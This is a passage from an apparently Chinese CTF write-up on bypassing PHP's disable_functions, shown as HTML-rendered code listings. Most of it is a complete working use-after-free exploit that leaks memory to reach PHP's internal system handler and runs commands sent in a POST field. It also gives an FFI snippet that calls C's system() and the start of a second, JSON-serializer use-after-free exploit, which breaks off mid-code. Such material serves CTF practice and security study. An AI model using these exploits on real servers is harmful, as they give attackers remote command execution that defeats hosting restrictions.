class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">pwn($_POST[<span class="string">"pass"</span>]);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span><span class="params">($cmd)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $abc, $helper;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">            $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $abc, $helper;</span><br><span class="line">        write($abc, <span class="number">0x68</span>, $addr + $p - <span class="number">0x10</span>);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = leak($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        $e_phoff = leak($base, <span class="number">0x20</span>);</span><br><span class="line">        $e_phentsize = leak($base, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        $e_phnum = leak($base, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            $p_flags = leak($header, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            $p_vaddr = leak($header, <span class="number">0x10</span>);</span><br><span class="line">            $p_memsz = leak($header, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                $data_addr = $e_type == <span class="number">2</span> ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>($p_type == <span class="number">1</span> &amp;&amp; $p_flags == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span><span class="params">($base, $elf)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $data_size / <span class="number">8</span>; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'constant' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            $leak = leak($data_addr, ($i + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak - $base &gt; <span class="number">0</span> &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                <span class="comment"># 'bin2hex' constant check</span></span><br><span class="line">                <span class="keyword">if</span>($deref != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> $data_addr + $i * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span><span class="params">($binary_leak)</span> </span>&#123;</span><br><span class="line">        $base = <span class="number">0</span>;</span><br><span class="line">        $start = $binary_leak &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x1000</span>; $i++) &#123;</span><br><span class="line">            $addr = $start - <span class="number">0x1000</span> * $i;</span><br><span class="line">            $leak = leak($addr, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>($leak == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span><span class="params">($basic_funcs)</span> </span>&#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>($f_name == <span class="number">0x6d6574737973</span>) &#123; <span class="comment"># system</span></span><br><span class="line">                <span class="keyword">return</span> leak($addr + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>($f_entry != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">ryat</span> </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> $ryat;</span><br><span class="line">        <span class="keyword">var</span> $chtg;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;chtg = <span class="keyword">$this</span>-&gt;ryat;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ryat = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">'WIN'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'This PoC is for *nix systems only.'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line">    $contiguous = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_repeat(<span class="string">'A'</span>, <span class="number">79</span>);</span><br><span class="line"></span><br><span class="line">    $poc = <span class="string">'a:4:&#123;i:0;i:1;i:1;a:1:&#123;i:0;O:4:"ryat":2:&#123;s:4:"ryat";R:3;s:4:"chtg";i:2;&#125;&#125;i:1;i:3;i:2;R:5;&#125;'</span>;</span><br><span class="line">    $out = unserialize($poc);</span><br><span class="line">    gc_collect_cycles();</span><br><span class="line"></span><br><span class="line">    $v = [];</span><br><span class="line">    $v[<span class="number">0</span>] = ptr2str(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">    <span class="keyword">unset</span>($v);</span><br><span class="line">    $abc = $out[<span class="number">2</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    $helper = <span class="keyword">new</span> Helper;</span><br><span class="line">    $helper-&gt;b = <span class="function"><span class="keyword">function</span> <span class="params">($x)</span> </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen($abc) == <span class="number">79</span> || strlen($abc) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"UAF failed"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leaks</span></span><br><span class="line">    $closure_handlers = str2ptr($abc, <span class="number">0</span>);</span><br><span class="line">    $php_heap = str2ptr($abc, <span class="number">0x58</span>);</span><br><span class="line">    $abc_addr = $php_heap - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake value</span></span><br><span class="line">    write($abc, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write($abc, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake reference</span></span><br><span class="line">    write($abc, <span class="number">0x10</span>, $abc_addr + <span class="number">0x60</span>);</span><br><span class="line">    write($abc, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    $closure_obj = str2ptr($abc, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    $binary_leak = leak($closure_handlers, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't determine binary base address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't parse ELF header"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get basic_functions address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Couldn't get zif_system address"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># fake closure object</span></span><br><span class="line">    $fake_obj_offset = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; <span class="number">0x110</span>; $i += <span class="number">8</span>) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># pwn</span></span><br><span class="line">    write($abc, <span class="number">0x20</span>, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); <span class="comment"># internal func type</span></span><br><span class="line">    write($abc, <span class="number">0xd0</span> + <span class="number">0x68</span>, $zif_system); <span class="comment"># internal func handler</span></span><br><span class="line"></span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="../../images/ctf/ctfhub/2.png" alt=""></p><h1 id="FFI-扩展"><a href="#FFI-扩展" class="headerlink" title="FFI 扩展"></a>FFI 扩展</h1><p>FFI扩展<br>php&gt;7.4，开启了FFI扩展ffi.enable=true，我们可以通过FFI来调用C中的system进而达到执行命令的目的<br><a href="https://www.laruence.com/2020/03/11/5475.html" target="_blank" rel="noopener">https://www.laruence.com/2020/03/11/5475.html</a>  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$ffi = FFI::cdef(<span class="string">"int system(const char *command);"</span>);</span><br><span class="line">$ffi-&gt;system(<span class="string">"/readflag &gt; /tmp/123"</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/123"</span>);</span><br><span class="line">@unlink(<span class="string">"/tmp/123"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>用蚁剑<br><img src="../../images/ctf/ctfhub/6.jpg" alt=""></p><h1 id="Json-Serializer-UAF"><a href="#Json-Serializer-UAF" class="headerlink" title="Json Serializer UAF"></a>Json Serializer UAF</h1><p>利用json序列化中的堆溢出触发，借以绕过disable_function，影响范围是:<br>7.1 – all versions to date<br>7.2 &lt; 7.2.19 (released: 30 May 2019)<br>7.3 &lt; 7.3.6 (released: 30 May 2019)<br><img src="../../images/ctf/ctfhub/7.jpg" alt=""></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line">$cmd = $_POST[<span class="string">"pass"</span>];</span><br><span class="line"></span><br><span class="line">$n_alloc = <span class="number">10</span>; <span class="comment"># increase this value if you get segfaults</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MySplFixedArray</span> <span class="keyword">extends</span> <span class="title">SplFixedArray</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> $leak;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Z</span> <span class="keyword">implements</span> <span class="title">JsonSerializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span><span class="params">(&amp;$str, $p, $v, $n = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">      $i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++) &#123;</span><br><span class="line">        $str[$p + $i] = chr($v &amp; <span class="number">0xff</span>);</span><br><span class="line">        $v &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span><span class="params">(&amp;$str, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $address = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>($j = $s<span class="number">-1</span>; $j &gt;= <span class="number">0</span>; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $address;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span><span class="params">($ptr, $m = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        $out = <span class="string">""</span>;</span><br><span class="line">        <span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= chr($ptr &amp; <span class="number">0xff</span>);</span><br><span class="line">            $ptr &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># unable to leak ro segments</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak1</span><span class="params">($addr)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, <span class="number">8</span>, $addr - <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">return</span> strlen(get_class($spl1));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># the real deal</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">leak2</span><span class="params">($addr, $p = <span class="number">0</span>, $s = <span class="number">8</span>)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $spl1, $fake_tbl_off;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake reference zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x10</span>, <span class="number">0xdeadbeef</span>); <span class="comment"># gc_refcounted</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x18</span>, $addr + $p - <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;write(<span class="keyword">$this</span>-&gt;abc, $fake_tbl_off + <span class="number">0x20</span>, <span class="number">6</span>); <span class="comment"># type (string)</span></span><br><span class="line"></span><br><span class="line">        $leak = strlen($spl1::$leak);</span><br><span class="line">        <span class="keyword">if</span>($s != <span class="number">8</span>) &#123; $leak %= <span class="number">2</span> &lt;&lt; ($s * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $leak;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span><span class="params">($base)</span> </span>&#123;</span><br><span class="line">        $e_type = <span class="keyword">$this</span>-&gt;leak2($base, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span 